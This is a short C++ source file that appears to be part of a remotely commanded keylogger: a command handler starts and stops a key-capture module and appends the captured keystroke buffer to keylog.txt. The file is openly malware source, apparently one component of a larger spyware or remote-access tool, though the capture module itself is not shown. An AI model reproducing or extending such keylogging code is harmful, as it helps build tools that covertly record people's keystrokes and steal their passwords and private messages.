#include "../../include/Commands/KeyCommand.h"
#include "../../include/Modules/KeyController.h"
#include <fstream>
#include <sstream>

std::string KeyCommand::execute(const std::string& args) {
    if (args == "start") {
        KeyControllerModule::start();
        return "[Key] capture started";
    }

    if (args == "stop") {
        KeyControllerModule::stop();
        return "[Key] capture stopped";
    }
    if (args == "dump") {
        std::string data = KeyControllerModule::getBuffer();

        std::ofstream f("keylog.txt", std::ios::app);
        if (f.is_open()) {
            f << data;
            f.close();
        }

        return "[Key] buffer dumped to keylog.txt";
    }

    return "[Key] Unknown key command: " + args;
}
